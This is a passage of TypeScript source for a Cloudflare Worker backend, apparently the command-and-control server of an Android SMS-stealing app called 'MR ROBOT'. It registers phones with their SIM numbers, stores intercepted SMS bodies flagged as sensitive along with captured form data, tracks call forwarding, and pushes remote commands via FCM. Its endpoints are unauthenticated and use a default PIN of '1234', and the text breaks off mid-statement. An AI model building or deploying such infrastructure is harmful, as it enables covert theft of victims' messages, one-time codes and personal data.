/// <reference types="@cloudflare/workers-types" />
import { Hono } from "hono";
import { cors } from "hono/cors";
import { neon } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-http";
import { and, asc, desc, eq, sql } from "drizzle-orm";
import {
  pgTable, serial, text, integer, boolean, timestamp, jsonb,
  uniqueIndex, index,
} from "drizzle-orm/pg-core";

// =================== ENV ===================
type Env = {
  NEON_DATABASE_URL: string;
  FIREBASE_SERVICE_ACCOUNT_JSON?: string;
  FIREBASE_PROJECT_ID?: string;
  FIREBASE_CLIENT_EMAIL?: string;
  FIREBASE_PRIVATE_KEY?: string;
  EVENT_BUS: DurableObjectNamespace;
  ASSETS: { fetch: (req: Request) => Promise<Response> };
};

// =================== SCHEMA ===================
const apps = pgTable("apps", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  name: text("name").notNull(),
  pin: text("pin").notNull().default("1234"),
  status: text("status").notNull().default("active"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId) }));

const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  deviceId: text("device_id").notNull(),
  appId: text("app_id").notNull(),
  userId: text("user_id").notNull(),
  name: text("name").notNull(),
  androidVersion: integer("android_version").notNull().default(0),
  sim1Carrier: text("sim1_carrier"),
  sim1Phone: text("sim1_phone"),
  sim2Carrier: text("sim2_carrier"),
  sim2Phone: text("sim2_phone"),
  status: text("status").notNull().default("offline"),
  lastOnline: timestamp("last_online", { withTimezone: true }),
  forwardEnabled: boolean("forward_enabled").notNull().default(false),
  forwardSlot: integer("forward_slot"),
  fcmToken: text("fcm_token"),
  installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
  appIdx: index("devices_app_idx").on(t.appId),
  userIdx: index("devices_user_idx").on(t.userId),
}));

const messages = pgTable("messages", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  userId: text("user_id").notNull(),
  fromSender: text("from_sender").notNull(),
  fromNumber: text("from_number").notNull(),
  body: text("body").notNull(),
  isSensitive: boolean("is_sensitive").notNull().default(false),
  receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
  deviceReceivedIdx: index("messages_device_received_idx").on(t.deviceId, t.receivedAt),
  userIdx: index("messages_user_idx").on(t.userId),
}));

const formData = pgTable("form_data", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  data: jsonb("data").notNull(),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
  deviceIdx: index("form_data_device_idx").on(t.deviceId),
}));

const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP_NAME = "MR ROBOT";
const DEFAULT_APP_PIN = "1234";

function getDb(env: Env) {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  return drizzle(sqlClient, { schema: { apps, devices, messages, formData } });
}

// =================== SCHEMA INIT (lazy, once-per-worker) ===================
let schemaInitPromise: Promise<void> | null = null;
async function ensureSchema(env: Env): Promise<void> {
  if (schemaInitPromise) return schemaInitPromise;
  schemaInitPromise = (async () => {
    const sqlClient = neon(env.NEON_DATABASE_URL);
    const stmts = [
      `CREATE TABLE IF NOT EXISTS apps (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        name TEXT NOT NULL,
        pin TEXT NOT NULL DEFAULT '1234',
        status TEXT NOT NULL DEFAULT 'active',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`,
      `CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id)`,
      `CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        device_id TEXT NOT NULL,
        app_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        name TEXT NOT NULL,
        android_version INTEGER NOT NULL DEFAULT 0,
        sim1_carrier TEXT,
        sim1_phone TEXT,
        sim2_carrier TEXT,
        sim2_phone TEXT,
        status TEXT NOT NULL DEFAULT 'offline',
        last_online TIMESTAMPTZ,
        forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
        forward_slot INTEGER,
        fcm_token TEXT,
        installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`,
      `CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id)`,
      `CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id)`,
      `CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id)`,
      `CREATE TABLE IF NOT EXISTS messages (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        from_sender TEXT NOT NULL,
        from_number TEXT NOT NULL,
        body TEXT NOT NULL,
        is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`,
      `CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at)`,
      `CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at)`,
      `CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id)`,
      `CREATE TABLE IF NOT EXISTS form_data (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        data JSONB NOT NULL,
        submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`,
      `CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at)`,
      `CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id)`,
      `CREATE TABLE IF NOT EXISTS admin_sessions (
        id TEXT PRIMARY KEY,
        login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        user_agent TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        device TEXT NOT NULL DEFAULT ''
      )`,
      `CREATE INDEX IF NOT EXISTS admin_sessions_login_idx ON admin_sessions(login_time DESC)`,
    ];
    for (const s of stmts) await sqlClient(s);
    // ensure default app
    await sqlClient(
      `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active')
       ON CONFLICT (app_id) DO NOTHING`,
      [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
    );
  })().catch((err) => { schemaInitPromise = null; throw err; });
  return schemaInitPromise;
}

// =================== MAPPERS ===================
function iso(d: Date | string | null | undefined): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}
function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}
function mapApp(r: typeof apps.$inferSelect) {
  return { id: r.id, appId: r.appId, name: r.name, pin: r.pin, status: r.status, createdAt: isoReq(r.createdAt) };
}
function mapDevice(r: typeof devices.$inferSelect) {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
    androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
  };
}
function mapMessage(r: typeof messages.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, body: r.body,
    isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
  };
}
function mapFormData(r: typeof formData.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}

// =================== PUB-SUB ===================
async function broadcast(env: Env, event: string, data: unknown): Promise<void> {
  try {
    const id = env.EVENT_BUS.idFromName("global");
    const stub = env.EVENT_BUS.get(id);
    await stub.fetch("https://do.local/broadcast", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ event, data }),
    });
  } catch (e) {
    console.warn("broadcast failed", e);
  }
}

// =================== FCM (Web Crypto JWT) ===================
type FirebaseCredentials = {
  project_id: string;
  private_key: string;
  client_email: string;
};

function normalizePrivateKey(raw: string): string {
  let key = raw.trim();
  if ((key.startsWith('"') && key.endsWith('"')) || (key.startsWith("'") && key.endsWith("'"))) {
    key = key.slice(1, -1);
  }
  key = key.replace(/\\n/g, "\n");
  if (!key.endsWith("\n")) key += "\n";
  return key;
}

function getFirebaseCredentials(env: Env): FirebaseCredentials {
  if (env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    const parsed = JSON.parse(env.FIREBASE_SERVICE_ACCOUNT_JSON) as FirebaseCredentials;
    parsed.private_key = normalizePrivateKey(parsed.private_key);
    return parsed;
  }
  const project_id = env.FIREBASE_PROJECT_ID?.trim();
  const client_email = env.FIREBASE_CLIENT_EMAIL?.trim();
  const rawKey = env.FIREBASE_PRIVATE_KEY;
  const private_key = rawKey ? normalizePrivateKey(rawKey) : undefined;
  if (!project_id || !client_email || !private_key) {
    throw new Error("Firebase FCM env missing. Set FIREBASE_PROJECT_ID, FIREBASE_CLIENT_EMAIL and FIREBASE_PRIVATE_KEY.");
  }
  return { project_id, client_email, private_key };
}

function b64urlFromBytes(bytes: ArrayBuffer | Uint8Array): string {
  const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let s = "";
  for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function b64urlFromString(s: string): string {
  return b64urlFromBytes(new TextEncoder().encode(s));
}
function b64FromPem(pem: string): Uint8Array {
  const body = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s+/g, "");
  const bin = atob(body);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

let cachedToken: { token: string; expiresAt: number } | null = null;

async function getFcmAccessToken(env: Env): Promise<string> {
  if (cachedToken && cachedToken.expiresAt > Date.now() + 60_000) {
    return cachedToken.token;
  }
  const creds = getFirebaseCredentials(env);
  const now = Math.floor(Date.now() / 1000);
  const header = { alg: "RS256", typ: "JWT" };
  const claim = {
    iss: creds.client_email,
    scope: "https://www.googleapis.com/auth/firebase.messaging",
    aud: "https://oauth2.googleapis.com/token",
    iat: now,
    exp: now + 3600,
  };
  const unsigned = `${b64urlFromString(JSON.stringify(header))}.${b64urlFromString(JSON.stringify(claim))}`;
  const keyData = b64FromPem(creds.private_key);
  const key = await crypto.subtle.importKey(
    "pkcs8",
    keyData,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, new TextEncoder().encode(unsigned));
  const jwt = `${unsigned}.${b64urlFromBytes(sig)}`;

  const res = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
      assertion: jwt,
    }),
  });
  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Google OAuth token error ${res.status}: ${body}`);
  }
  const json = await res.json() as { access_token: string; expires_in: number };
  cachedToken = {
    token: json.access_token,
    expiresAt: Date.now() + (json.expires_in * 1000),
  };
  return cachedToken.token;
}

async function sendFcmToToken(env: Env, fcmToken: string, data: Record<string, string>): Promise<{ messageId: string }> {
  const accessToken = await getFcmAccessToken(env);
  const creds = getFirebaseCredentials(env);
  const fcmUrl = `https://fcm.googleapis.com/v1/projects/${creds.project_id}/messages:send`;
  const res = await fetch(fcmUrl, {
    method: "POST",
    headers: { Authorization: `Bearer ${accessToken}`, "content-type": "application/json" },
    body: JSON.stringify({ message: { token: fcmToken, data } }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) {
    throw Object.assign(new Error("FCM rejected"), { fcmStatus: res.status, fcmBody: body });
  }
  return { messageId: String(body["name"] ?? "sent") };
}

// =================== ADMIN SESSIONS (Postgres-backed for cross-isolate consistency) ===================
type AdminSession = {
  id: string; loginTime: string; lastActive: string;
  userAgent: string; ip: string; device: string;
};
function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/.test(ua)) return "Mac";
  if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}

// =================== UTIL ===================
const VALIDITY_DAYS = 30;
function isExpired(createdAt: string | Date): boolean {
  const created = new Date(createdAt).getTime();
  return Date.now() > created + VALIDITY_DAYS * 86_400_000;
}

// =================== APP ===================
const app = new Hono<{ Bindings: Env }>();
app.use("*", cors({
  origin: "*",
  allowMethods: ["GET", "POST", "PATCH", "PUT", "DELETE", "OPTIONS"],
  allowHeaders: ["Content-Type", "Authorization"],
}));

app.use("*", async (c, next) => {
  // Lazy schema init on first request
  await ensureSchema(c.env);
  await next();
});

// ------- HEALTH -------
app.get("/api/healthz", (c) => c.json({ status: "ok" }));

// ------- APPS -------
app.get("/api/apps", async (c) => {
  const db = getDb(c.env);
  const rows = await db.select().from(apps).orderBy(asc(apps.createdAt));
  // auto-disable expired
  for (const r of rows) {
    if (r.appId === DEFAULT_APP_ID && r.status !== "active") {
      await db.update(apps).set({ status: "active" }).where(eq(apps.appId, r.appId));
    } else if (r.appId !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.createdAt)) {
      await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, r.appId));
    }
  }
  const fresh = await db.select().from(apps).orderBy(asc(apps.createdAt));
  return c.json(fresh.map(mapApp));
});

app.get("/api/apps/:appId", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.param("appId");
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    const [updated] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
    return c.json(updated ? mapApp(updated) : mapApp(row));
  }
  return c.json(mapApp(row));
});

app.post("/api/apps", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; name?: string; pin?: string; status?: string };
  if (!body.appId || !body.name) return c.json({ error: "appId and name are required" }, 400);
  const inserted = await db.insert(apps).values({
    appId: body.appId, name: body.name,
    pin: body.pin ?? "1234", status: body.status ?? "active",
  }).onConflictDoNothing({ target: apps.appId }).returning();
  if (inserted.length === 0) return c.json({ error: "App ID already exists" }, 409);
  return c.json(mapApp(inserted[0]), 201);
});

app.patch("/api/apps/:appId", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { name?: string; pin?: string; status?: string };
  const patch: Partial<typeof apps.$inferInsert> = {};
  if (body.name !== undefined) patch.name = body.name;
  if (body.pin !== undefined) patch.pin = body.pin;
  if (body.status !== undefined) patch.status = body.status;
  if (Object.keys(patch).length === 0) return c.json({ error: "No fields to update" }, 400);
  const [row] = await db.update(apps).set(patch).where(eq(apps.appId, c.req.param("appId"))).returning();
  if (!row) return c.json({ error: "App not found" }, 404);
  return c.json(mapApp(row));
});

app.delete("/api/apps/:appId", async (c) => {
  const db = getDb(c.env);
  const [row] = await db.delete(apps).where(eq(apps.appId, c.req.param("appId"))).returning();
  if (!row) return c.json({ error: "App not found" }, 404);
  return c.json({ ok: true });
});

app.post("/api/apps/:appId/verify-pin", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { pin?: string };
  if (!body.pin) return c.json({ error: "PIN required" }, 400);
  const appId = c.req.param("appId");
  const [row] = await db.select().from(apps).where(eq(apps.appId, appId)).limit(1);
  if (!row) return c.json({ error: "App not found" }, 404);
  if (row.appId !== DEFAULT_APP_ID && row.status === "active" && isExpired(row.createdAt)) {
    await db.update(apps).set({ status: "disabled" }).where(eq(apps.appId, appId));
    return c.json({ error: "App is disabled" }, 403);
  }
  if (row.status !== "active") return c.json({ error: "App is disabled" }, 403);
  if (row.pin !== body.pin) return c.json({ error: "Wrong PIN" }, 401);
  return c.json({ ok: true, appId: row.appId, name: row.name });
});

// ------- DEVICES -------
app.get("/api/devices", async (c) => {
  const db = getDb(c.env);
  const userId = c.req.query("userId");
  const appId = c.req.query("appId");
  const where = appId ? eq(devices.appId, appId) : userId ? eq(devices.userId, userId) : undefined;
  const rows = where
    ? await db.select().from(devices).where(where)
    : await db.select().from(devices);
  return c.json(rows.map(mapDevice));
});

app.get("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const [row] = await db.select().from(devices).where(eq(devices.deviceId, c.req.param("deviceId"))).limit(1);
  if (!row) return c.json({ error: "Device not found" }, 404);
  return c.json(mapDevice(row));
});

app.patch("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
  if (body.status !== undefined) patch.status = String(body.status);
  if (body.lastOnline !== undefined) patch.lastOnline = body.lastOnline ? new Date(String(body.lastOnline)) : null;
  if (body.fcmToken !== undefined) patch.fcmToken = String(body.fcmToken);
  if (body.forwardEnabled !== undefined) patch.forwardEnabled = Boolean(body.forwardEnabled);
  if (body.forwardSlot !== undefined) patch.forwardSlot = body.forwardSlot === null ? null : Number(body.forwardSlot);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, c.req.param("deviceId"))).returning();
  if (!row) return c.json({ error: "Device not found" }, 404);
  const mapped = mapDevice(row);
  await broadcast(c.env, "device_updated", mapped);
  return c.json(mapped);
});

// ------- MESSAGES -------
app.get("/api/messages", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const userId = c.req.query("userId");
  const deviceId = c.req.query("deviceId");
  const where = appId ? eq(messages.appId, appId)
    : userId ? eq(messages.userId, userId)
    : deviceId ? eq(messages.deviceId, deviceId)
    : undefined;
  const rows = where
    ? await db.select().from(messages).where(where).orderBy(desc(messages.receivedAt))
    : await db.select().from(messages).orderBy(desc(messages.receivedAt));
  return c.json(rows.map(mapMessage));
});

app.post("/api/messages", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.fromNumber || !body.body) {
    return c.json({ error: "appId, deviceId, fromNumber and body are required" }, 400);
  }
  const senderStr = String(body.fromSender ?? "");
  if (senderStr.toLowerCase().startsWith("call forward")) {
    return new Response(null, { status: 204 });
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  const [inserted] = await db.insert(messages).values({
    appId: String(body.appId),
    deviceId: String(body.deviceId),
    userId: uid,
    fromSender: String(body.fromSender ?? "Unknown"),
    fromNumber: String(body.fromNumber),
    body: String(body.body),
    isSensitive: Boolean(body.isSensitive ?? false),
  }).returning();
  const mapped = mapMessage(inserted);
  await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
  return c.json({ ok: true, id: mapped.id }, 201);
});

// ------- FORM DATA -------
app.get("/api/data", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const deviceId = c.req.query("deviceId");
  if (!appId) return c.json({ error: "appId is required" }, 400);
  const where = deviceId
    ? and(eq(formData.appId, appId), eq(formData.deviceId, deviceId))
    : eq(formData.appId, appId);
  const rows = await db.select().from(formData).where(where).orderBy(desc(formData.submittedAt));
  return c.json(rows.map(mapFormData));
});

app.post("/api/data", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; deviceId?: string; data?: Record<string, unknown> };
  if (!body.appId || !body.deviceId) return c.json({ error: "appId and deviceId are required" }, 400);
  if (!body.data || typeof body.data !== "object" || Array.isArray(body.data)) {
    return c.json({ error: "data must be a JSON object" }, 400);
  }
  const [row] = await db.insert(formData).values({
    appId: body.appId, deviceId: body.deviceId, data: body.data,
  }).returning();
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_added", { appId: mapped.appId, formData: mapped });
  return c.json(mapped, 201);
});

app.delete("/api/data/:id", async (c) => {
  const db = getDb(c.env);
  const id = Number(c.req.param("id"));
  if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
  const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
  if (!row) return c.json({ error: "Not found" }, 404);
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_deleted", { appId: mapped.appId, id });
  return c.json({ ok: true });
});

// ------- REGISTER + HEARTBEAT -------
async function upsertDeviceRaw(env: Env, input: {
  deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  fcmToken: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
}): Promise<{ row: ReturnType<typeof mapDevice>; created: boolean }> {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
     ON CONFLICT (device_id) DO UPDATE SET
       app_id = EXCLUDED.app_id,
       user_id = EXCLUDED.user_id,
       name = EXCLUDED.name,
       android_version = EXCLUDED.android_version,
       sim1_carrier = EXCLUDED.sim1_carrier,
       sim1_phone = EXCLUDED.sim1_phone,
       sim2_carrier = EXCLUDED.sim2_carrier,
       sim2_phone = EXCLUDED.sim2_phone,
       status = EXCLUDED.status,
       last_online = EXCLUDED.last_online,
       forward_enabled = EXCLUDED.forward_enabled,
       forward_slot = EXCLUDED.forward_slot,
       fcm_token = EXCLUDED.fcm_token,
       updated_at = NOW()
     RETURNING *, (xmax = 0) AS was_created`,
    [
      input.deviceId, input.appId, input.userId, input.name, input.androidVersion,
      input.sim1Carrier, input.sim1Phone, input.sim2Carrier, input.sim2Phone,
      input.status, input.lastOnline ? new Date(input.lastOnline) : null,
      input.forwardEnabled, input.forwardSlot, input.fcmToken,
    ],
  ) as Array<Record<string, unknown>>;
  const r = rows[0];
  const mapped = {
    id: Number(r.id), deviceId: String(r.device_id), appId: String(r.app_id),
    userId: String(r.user_id), name: String(r.name),
    androidVersion: Number(r.android_version),
    sim1Carrier: (r.sim1_carrier as string | null) ?? null,
    sim1Phone: (r.sim1_phone as string | null) ?? null,
    sim2Carrier: (r.sim2_carrier as string | null) ?? null,
    sim2Phone: (r.sim2_phone as string | null) ?? null,
    status: String(r.status),
    lastOnline: iso(r.last_online as Date | string | null),
    forwardEnabled: Boolean(r.forward_enabled),
    forwardSlot: r.forward_slot == null ? null : Number(r.forward_slot),
    fcmToken: (r.fcm_token as string | null) ?? null,
    installedAt: isoReq(r.installed_at as Date | string),
    updatedAt: isoReq(r.updated_at as Date | string),
  };
  return { row: mapped, created: Boolean(r.was_created) };
}

app.post("/api/register", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.name) {
    return c.json({ error: "appId, deviceId and name are required" }, 400);
  }
  const safeAppId = String(body.appId);
  // auto-create app if missing
  const existing = await db.select().from(apps).where(eq(apps.appId, safeAppId)).limit(1);
  if (existing.length === 0) {
    await db.insert(apps).values({
      appId: safeAppId, name: safeAppId, pin: "1234", status: "active",
    }).onConflictDoNothing({ target: apps.appId });
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  const { row, created } = await upsertDeviceRaw(c.env, {
    appId: safeAppId,
    deviceId: String(body.deviceId),
    userId: uid,
    name: String(body.name),
    androidVersion: Number(body.androidVersion ?? 0),
    sim1Carrier: body.sim1Carrier != null ? String(body.sim1Carrier) : null,
    sim1Phone: body.sim1Phone != null ? String(body.sim1Phone) : null,
    sim2Carrier: body.sim2Carrier != null ? String(body.sim2Carrier) : null,
    sim2Phone: body.sim2Phone != null ? String(body.sim2Phone) : null,
    fcmToken: body.fcmToken != null ? String(body.fcmToken) : null,
    status: "online",
    lastOnline: new Date().toISOString(),
    forwardEnabled: false, forwardSlot: null,
  });
  await broadcast(c.env, "device_updated", row);
  return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
});

app.post("/api/heartbeat", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  const uid = String(body.deviceId);
  const now = new Date();
  const patch: Partial<typeof devices.$inferInsert> = {
    status: "online", lastOnline: now, updatedAt: now,
  };
  if (body.fcmToken != null) patch.fcmToken = String(body.fcmToken);
  let [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, uid)).returning();
  if (!row) {
    const safeAppId = body.appId ? String(body.appId) : DEFAULT_APP_ID;
    const existing = await db.select().from(apps).where(eq(apps.appId, safeAppId)).limit(1);
    if (existing.length === 0) {
      await db.insert(apps).values({
        appId: safeAppId, name: safeAppId, pin: "1234", status: "active",
      }).onConflictDoNothing({ target: apps.appId });
    }
    const { row: created } = await upsertDeviceRaw(c.env, {
      appId: safeAppId, deviceId: uid,
      userId: `USR-${uid.slice(-6).toUpperCase()}`,
      name: uid, androidVersion: 0,
      sim1Carrier: null, sim1Phone: null, sim2Carrier: null, sim2Phone: null,
      fcmToken: body.fcmToken != null ? String(body.fcmToken) : null,
      status: "online", lastOnline: new Date().toISOString(),
      forwardEnabled: false, forwardSlot: null,
    });
    await broadcast(c.env, "device_updated", created);
    return c.json({ ok: true });
  }
  await broadcast(c.env, "device_updated", mapDevice(row));
  return c.json({ ok: true });
});

// ------- FCM -------
app.post("/api/fcm/send", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { deviceId?: string; data?: Record<string, string> };
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  if (!body.data || typeof body.data !== "object") return c.json({ error: "data object is required" }, 400);
  const [device] = await db.select().from(devices).where(eq(devices.deviceId, body.deviceId)).limit(1);
  if (!device) return c.json({ error: "Device not found" }, 404);
  if (!device.fcmToken) return c.json({ error: "Device has no FCM token registered" }, 422);

  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data)) safeData[k] = String(v);

  try {
    const result = await sendFcmToToken(c.env, device.fcmToken, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: { error?: { message?: string; details?: Array<{ errorCode?: string }> } } };
    const errorCode = e.fcmBody?.error?.details?.[0]?.errorCode;
    const msg = e.fcmBody?.error?.message;
    if (e.fcmStatus === 404 || errorCode === "UNREGISTERED") {
      return c.json({
        error: "Phone ka FCM token purana ho gaya. Device pe app open karo — naya token automatically register ho jayega, fir command dobara bhejo.",
        detail: msg,
      }, 410);
    }
    if (e.fcmStatus === 400 && (msg?.includes("not a valid FCM registration token") || msg?.includes("INVALID_ARGUMENT"))) {
      return c.json({
        error: "FCM token invalid — Android app ko reinstall karo aur fresh heartbeat bhejo.",
        detail: msg,
      }, 400);
    }
    if (e.fcmStatus) return c.json({ error: e.fcmBody }, e.fcmStatus as 400);
    return c.json({ error: e.message }, 500);
  }
});

app.post("/api/fcm/online-check", async (c) => {
  const body = await c.req.json() as { token?: string; data?: Record<string, string> };
  if (!body.token) return c.json({ error: "token is required" }, 400);
  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data ?? { type: "online_check" })) safeData[k] = String(v);
  try {
    const result = await sendFcmToToken(c.env, body.token, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: unknown };
    if (e.fcmStatus) return c.json({ error: e.fcmBody }, e.fcmStatus as 400);
    return c.json({ error: e.message }, 500);
  }
});

// ------- ADMIN SESSIONS (Postgres-backed) -------
app.get("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `SELECT id, login_time, last_active, user_agent, ip, device FROM admin_sessions ORDER BY login_time DESC`,
  ) as Array<Record<string, unknown>>;
  const list: AdminSession[] = rows.map((r) => ({
    id: String(r.id),
    loginTime: isoReq(r.login_time as Date | string),
    lastActive: isoReq(r.last_active as Date | string),
    userAgent: String(r.user_agent ?? ""),
    ip: String(r.ip ?? ""),
    device: String(r.device ?? ""),
  }));
  return c.json(list);
});
app.post("/api/admin/sessions", async (c) => {
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const ua = c.req.header("user-agent") ?? "";
  const ip = (c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "unknown").split(",")[0].trim();
  const id = crypto.randomUUID();
  await sqlClient(
